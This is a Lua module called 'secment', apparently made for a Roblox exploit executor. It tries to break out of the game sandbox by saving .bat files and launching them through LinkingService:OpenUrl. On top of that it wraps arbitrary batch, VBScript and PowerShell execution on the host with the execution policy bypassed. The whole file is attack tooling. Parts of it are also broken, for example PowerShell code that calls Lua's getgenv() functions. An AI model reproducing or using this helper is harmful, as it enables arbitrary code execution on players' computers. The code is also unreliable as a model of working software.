local secment = {}

-- Function to create and run a batch script
function secment.bat(code)
    local name = math.random(100000, 999999)
    local batContent = [[
@echo off
]] .. code .. [[
]]
    local batFileName = tostring(name) .. ".bat"
    game:GetService("LinkingService"):OpenUrl(game:GetService("ScriptContext"):SaveScriptProfilingData(batContent, batFileName))
end

-- Function to create and run a VBS script
function secment.vbs(code)
    secment.bat([[ 
@echo off
setlocal

(
echo ]] .. code .. [[
) > temp_script.vbs

cscript //nologo temp_script.vbs
del temp_script.vbs
]])
end

-- Function to run a PowerShell command
function secment.powershell(code)
    secment.bat([[Powershell.exe -ExecutionPolicy Bypass -Command "]] .. code .. [[" & del temp_script.ps1]])
end

-- Function to show a message box using PowerShell
function secment.msgbox(message)
    secment.powershell([[Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(']] .. message .. [[')]])
end

-- Function to create a GUI prompt with options
function secment.gui(banner, options)
    local guiCode = [[
Add-Type -AssemblyName System.Windows.Forms
$banner = "]] .. banner .. [["
$inputText = "input >"
$options = [System.Windows.Forms.MessageBox]::Show($banner + "`n" + $inputText, "Select an Option", [System.Windows.Forms.MessageBoxButtons]::YesNoCancel)

switch ($options) {
    [System.Windows.Forms.DialogResult]::Yes { getgenv().Option1() }
    [System.Windows.Forms.DialogResult]::No { getgenv().Option2() }
    [System.Windows.Forms.DialogResult]::Cancel { getgenv().Option3() }
}
]]

    -- Loop to create options 4 and 5
    for i = 4, 5 do
        guiCode = guiCode .. [[
if ($options -eq [System.Windows.Forms.DialogResult]::]] .. (i == 4 and "No" or "Cancel") .. [[) {
    getgenv().Option]] .. i .. [[()
}
]]
    end
    
    secment.powershell(guiCode)
end

-- Function to print all available functions and their descriptions
function secment.help()
    print("Available Functions:")
    print("1. secment.bat(code) - Creates and runs a batch script.")
    print("2. secment.vbs(code) - Creates and runs a VBS script.")
    print("3. secment.powershell(code) - Executes a PowerShell command.")
    print("4. secment.msgbox(message) - Shows a message box using PowerShell.")
    print("5. secment.gui(banner, options) - Creates a GUI prompt with options.")
    print("6. secment.help() - Prints this help message.")
end

return secment
